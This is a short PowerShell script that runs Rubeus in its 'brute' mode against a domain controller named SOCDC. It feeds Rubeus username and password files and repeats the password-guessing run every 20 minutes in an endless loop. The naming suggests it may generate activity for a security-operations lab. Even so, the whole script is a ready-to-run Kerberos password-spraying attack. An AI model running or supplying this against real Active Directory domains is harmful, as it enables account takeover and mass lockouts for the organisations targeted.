# Run Rubeus with the username and password files for Account Guessing
$sleepTimer = 1200;

while($true) {

& 'C:\Program Files\Rubeus\Rubeus.exe' brute /passwords:'C:\Program Files\Rubeus\passwords.txt' /users:'C:\Program Files\Rubeus\usernames.txt' /dc:SOCDC /noticket /verbose

Start-Sleep -s $sleepTimer; 
}